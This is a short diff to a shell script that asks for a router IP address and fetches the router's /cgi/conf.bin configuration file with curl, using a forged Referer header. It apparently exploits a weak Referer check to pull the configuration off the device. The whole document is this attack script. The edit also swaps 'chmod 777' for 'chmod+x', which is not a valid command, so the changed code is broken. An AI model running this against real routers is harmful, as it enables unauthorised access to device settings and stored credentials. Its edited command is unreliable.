@@ -1,5 +1,5 @@
 echo -n "Enter Your Router IP Address : ";
 read ip;
 echo "curl -i -s -k -X GET -H 'Referer: http://$ip/mainFrame.htm' http://$ip/cgi/conf.bin > conf.bin" > get;
-sudo chmod 777 get;
+sudo chmod+x get;
 ./get;
